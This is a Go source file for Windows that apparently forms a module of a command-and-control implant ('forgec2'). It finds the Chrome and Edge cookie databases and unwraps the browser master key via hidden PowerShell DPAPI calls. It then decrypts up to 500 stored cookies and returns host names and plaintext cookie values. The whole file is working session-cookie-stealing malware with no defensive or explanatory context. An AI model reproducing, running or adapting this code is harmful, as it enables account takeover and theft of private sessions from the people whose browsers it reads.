//go:build windows
// +build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	_ "modernc.org/sqlite"
)

type browserCookieStore struct {
	Name       string
	LocalState string
	CookieDBs  []string
}

func exportCookies(browser string) string {
	stores := []browserCookieStore{
		{
			Name:       "Chrome",
			LocalState: os.ExpandEnv(`%LOCALAPPDATA%\Google\Chrome\User Data\Local State`),
			CookieDBs: []string{
				os.ExpandEnv(`%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies`),
				os.ExpandEnv(`%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies`),
			},
		},
		{
			Name:       "Edge",
			LocalState: os.ExpandEnv(`%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State`),
			CookieDBs: []string{
				os.ExpandEnv(`%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network\Cookies`),
				os.ExpandEnv(`%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies`),
			},
		},
	}

	filter := strings.ToLower(strings.TrimSpace(browser))
	if filter == "" {
		filter = "all"
	}

	var sb strings.Builder
	for _, store := range stores {
		if filter != "all" && filter != strings.ToLower(store.Name) {
			continue
		}
		sb.WriteString(exportBrowserCookies(store))
	}
	if sb.Len() == 0 {
		return "no cookie databases found (browser may be closed or path differs)\n"
	}
	return sb.String()
}

func exportBrowserCookies(store browserCookieStore) string {
	var cookieDB string
	for _, candidate := range store.CookieDBs {
		if _, err := os.Stat(candidate); err == nil {
			cookieDB = candidate
			break
		}
	}
	if cookieDB == "" {
		return fmt.Sprintf("=== %s COOKIES ===\n(not found)\n", store.Name)
	}

	masterKey, err := getBrowserMasterKey(store.LocalState)
	if err != nil {
		return fmt.Sprintf("=== %s COOKIES ===\nmaster key error: %v\n", store.Name, err)
	}

	tmpCopy := filepath.Join(os.TempDir(), fmt.Sprintf("forgec2_cookies_%s.db", strings.ToLower(store.Name)))
	data, err := os.ReadFile(cookieDB)
	if err != nil {
		return fmt.Sprintf("=== %s COOKIES ===\nread error: %v\n", store.Name, err)
	}
	if err := os.WriteFile(tmpCopy, data, 0644); err != nil {
		return fmt.Sprintf("=== %s COOKIES ===\ncopy error: %v\n", store.Name, err)
	}
	defer os.Remove(tmpCopy)

	db, err := sql.Open("sqlite", tmpCopy)
	if err != nil {
		return fmt.Sprintf("=== %s COOKIES ===\nsqlite open error: %v\n", store.Name, err)
	}
	defer db.Close()

	rows, err := db.Query(`SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies LIMIT 500`)
	if err != nil {
		return fmt.Sprintf("=== %s COOKIES ===\nquery error: %v\n", store.Name, err)
	}
	defer rows.Close()

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== %s COOKIES ===\n", store.Name))
	count := 0
	for rows.Next() {
		var host, name, path string
		var enc []byte
		var expires int64
		if err := rows.Scan(&host, &name, &path, &enc, &expires); err != nil {
			continue
		}
		value := decryptCookieValue(enc, masterKey)
		sb.WriteString(fmt.Sprintf("%s\t%s\t%s\texpires=%d\tvalue=%s\n", host, name, path, expires, value))
		count++
	}
	sb.WriteString(fmt.Sprintf("--- exported %d cookies ---\n", count))
	return sb.String()
}

func getBrowserMasterKey(localStatePath string) ([]byte, error) {
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}
	var state struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(data, &state); err != nil {
		return nil, err
	}
	if state.OsCrypt.EncryptedKey == "" {
		return nil, fmt.Errorf("no encrypted_key in Local State")
	}

	encKey, err := base64.StdEncoding.DecodeString(state.OsCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	if len(encKey) > 5 && string(encKey[:5]) == "DPAPI" {
		encKey = encKey[5:]
	}

	ps := fmt.Sprintf(
		`Add-Type -AssemblyName System.Security; $b=[Convert]::FromBase64String('%s'); $k=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser); [Convert]::ToBase64String($k)`,
		base64.StdEncoding.EncodeToString(encKey))
	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", ps)
	applyHideWindow(cmd)
	out, err := cmd.Output()
	if err != nil {
		return nil, fmt.Errorf("DPAPI decrypt master key: %w", err)
	}
	return base64.StdEncoding.DecodeString(strings.TrimSpace(string(out)))
}

func decryptCookieValue(enc []byte, masterKey []byte) string {
	if len(enc) == 0 {
		return ""
	}
	if len(enc) >= 3 && (string(enc[:3]) == "v10" || string(enc[:3]) == "v11") {
		if len(masterKey) == 0 || len(enc) < 15 {
			return "[encrypted]"
		}
		nonce := enc[3:15]
		ciphertext := enc[15:]
		block, err := aes.NewCipher(masterKey)
		if err != nil {
			return "[aes-error]"
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return "[gcm-error]"
		}
		plain, err := gcm.Open(nil, nonce, ciphertext, nil)
		if err != nil {
			return "[decrypt-failed]"
		}
		return string(plain)
	}

	ps := fmt.Sprintf(
		`Add-Type -AssemblyName System.Security; $b=[Convert]::FromBase64String('%s'); try { $p=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser); [Text.Encoding]::UTF8.GetString($p) } catch { '[dpapi-failed]' }`,
		base64.StdEncoding.EncodeToString(enc))
	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", ps)
	applyHideWindow(cmd)
	out, _ := cmd.Output()
	return strings.TrimSpace(string(out))
}